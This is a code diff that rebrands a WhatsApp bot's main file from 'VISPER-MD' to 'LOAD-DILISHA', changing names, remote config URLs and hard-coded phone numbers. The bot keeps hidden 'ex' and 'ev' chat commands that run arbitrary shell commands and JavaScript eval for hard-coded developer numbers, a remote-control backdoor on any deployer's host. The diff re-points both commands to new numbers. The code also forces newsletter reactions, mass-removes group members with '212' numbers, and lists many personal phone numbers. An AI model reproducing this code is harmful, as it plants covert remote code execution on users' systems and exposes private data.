@@ -57,7 +57,7 @@ const df = __dirname + '/auth_info_baileys/creds.json';
 
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
-    const sessdata = config.SESSION_ID.replace("VISPER-MD&", "");
+    const sessdata = config.SESSION_ID.replace("LOAD_DILISHA=", "");
 
     if (sessdata.includes("#")) {
       const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
@@ -85,7 +85,7 @@ async function downloadSession(sessdata, df) {
 
   for (let i = 0; i < dbUrls.length; i++) {
     const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
-    console.log(`📥 Downloading session from visper-DB`);
+    console.log(`📥 Downloading session from load-DB`);
 
     try {
       const response = await axios.get(sessionUrl);
@@ -142,7 +142,7 @@ async function connectToWA() {
 
 
 
-const responsee = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+const responsee = await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json');
 const connectnumber = responsee.data
 	
 // Default owner JID
@@ -163,7 +163,7 @@ conn.ev.on('connection.update', async (update) => {
                 // Fetch custom connect message from server
                 let captionText = '✅ VISPER connected successfully!';
                 try {
-                    const response = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+                    const response = await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json');
                     const ownerdataa = response.data;
                     captionText = ownerdataa?.connectmg || captionText;
                 } catch (fetchErr) {
@@ -172,7 +172,7 @@ conn.ev.on('connection.update', async (update) => {
 
                 // Send initial connect image
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
+                    image: { url: 'https://files.catbox.moe/ha3kuk.jpg' },
                     caption: captionText
                 });
 const mvSize = config.MV_SIZE;
@@ -214,7 +214,7 @@ const antiDelete = config.ANTI_DELETE;
 const leaveMsg = config.LEAVE_MSG;
                 // Build config message
   const can = `
-*⚙️ BOT CURRENTLY SETTINGS ⚙️*
+*📤 AVAIBLE KING DILISHA SETTINGS 📤*
 
 *\`• Owner Number :\`* ${DEFAULT_OWNER_JID || "Not Set"}
 *\`• Bot Name :\`* ${botName || "Not Set"}
@@ -256,7 +256,7 @@ const leaveMsg = config.LEAVE_MSG;
 `;
 
 
-     let joinlink2 = await fetchJson('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json');
         
         if (!joinlink2 || !joinlink2.supglink) {
             console.error('❌ Invalid join link data!');
@@ -276,7 +276,7 @@ const leaveMsg = config.LEAVE_MSG;
 				 console.log("✅ Successfully joined the group!");
                 // Send config message
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
+                    image: { url: 'https://files.catbox.moe/ha3kuk.jpg' },
                     caption: can
                 });
 
@@ -296,10 +296,10 @@ fs.readdirSync("./plugins/").forEach((plugin) => {
   }
 });
 
-console.log('All Plugins installed ⚡')
+console.log('All Plugins Installed Successfully 📤')
 await connectdb()
 await updb()		
-console.log('VISPER MOVIE DL CONNECTED ✅')
+console.log('KING DILISHA DOWNLOAD CONNECTED ✅')
 
 
 
@@ -311,7 +311,7 @@ console.log('VISPER MOVIE DL CONNECTED ✅')
 
 
 
-const ownerdataa = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
+const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json')).data;
      
          
 
@@ -430,7 +430,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319,94719255382`
+const developers = `94754871798,94771098429,94775700815`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -840,12 +840,12 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   }
 }
 
-const ownerdata = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json')).data
             
            
             config.FOOTER = ownerdata.footer
            
-const preUser = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/premium_user.json`)
+const preUser = await fetchJson(`https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/premium_users.json`)
 const preUsers = preUser.numbers.split(",");
 
 // replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
@@ -859,7 +859,7 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-const banbn = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/ban_number.json`)
+const banbn = await fetchJson(`https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/ban_number.json`)
 const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
@@ -876,13 +876,13 @@ const isBanGrp = [ ...gpIdz ]
 
 
 const banGroups = await fetchJson(
-  "https://mv-visper-full-db.pages.dev/Main/ban_group.json"
+  "https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/ban_group.json"
 );          // banGroups === [ "1203...", ... ]
 
 const isBanvisper = banGroups
   .map(id => id.replace(/[^0-9]/g, "") + "@g.us") // "1203…" ➜ "1203…@g.us"
   .includes(from);   
-const SUDO = config.SUDO; // eg: [ '94778500326@s.whatsapp.net', '194558377910501@lid' ]
+const SUDO = config.SUDO; // eg: [ '94771098429@s.whatsapp.net', '194558377910501@lid' ]
 
 const isSudo = SUDO.filter(jid => jid.endsWith('@lid') === sender.endsWith('@lid'))
                    .includes(sender);
@@ -894,72 +894,33 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data
+const rec = (await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/react.json')).data
 
-const recc = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data
+const recc = (await axios.get('https://raw.githubusercontent.com/Load-Dilisha/LOAD-DILISHA_DATABASE/refs/heads/main/main_var.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
 const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
 const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
 await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
-await conn.newsletterReactMessage(`120363304606757133@newsletter`, id, randomEmoji);
+await conn.newsletterReactMessage(`120363405102534270@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94724375368")){
-if(isReact) return
-m.react(`${rec.sadas}`)
-}
-if(senderNumber.includes("94722617699")){
-if(isReact) return
-m.react(`${rec.saviya}`)
-}
-if(senderNumber.includes("94756857260")){
-if(isReact) return
-m.react(`${rec.alex}`)
-}
-if(senderNumber.includes("94719255382")){
-if(isReact) return
-m.react(`${rec.poorna}`)
-}
-if(senderNumber.includes("94724884317")){
-if(isReact) return
-m.react(`${rec.damiru}`)
 
-}
-if(senderNumber.includes("94787318729")){
-if(isReact) return
-m.react(`${rec.sadas}`)
-
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-
-}
-if(senderNumber.includes("94711451319")){
-if(isReact) return
-m.react(`👨‍💻`)
-}
 		
 		
-if(senderNumber.includes("94742524701")){
+if(senderNumber.includes("94754871798")){
 if(isReact) return
 m.react(`${rec.alex}`)
 
 }
 
-if(senderNumber.includes("94766863255")){
-if(isReact) return
-m.react(`❤️‍🔥`)
-
-}
 		
 const ownNum = config.OWNER_NUMBER;
 
             if(senderNumber.includes(ownNum)){
 if(isReact) return 
-m.react(`🕵️`)
+m.react(`👑`)
             }
 //===================================================================================
 
@@ -996,7 +957,7 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by VISPER TEAM ❌*" })
+	return await conn.sendMessage(from, { text: "*You Are Banned Load-Dilisha 🚫*" })
 }
 
 	
@@ -1332,12 +1293,12 @@ if(!isOwner) {
     if(originalMessage.message.stickerMessage){
      
     //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
-     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'VISPER-MD 🌟'})
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'KING_DILISHA-MD 📤'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
     
     }else{
     
-    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'VISPER-MD 🌟'})
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'KING_DILISHA-MD 📤'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
     
       }
@@ -1707,7 +1668,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94775700815) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1719,7 +1680,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94771098429) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1740,7 +1701,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94754871798) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1755,7 +1716,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
+    if(senderNumber == 94771098429 || senderNumber == 94754871798) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1782,9 +1743,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("📟 VISPER DL Working successfully!");
+  res.send("📟 LOAD-DILISHA Working Successfully!!");
 });
-app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Load-Dilisha-MD Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
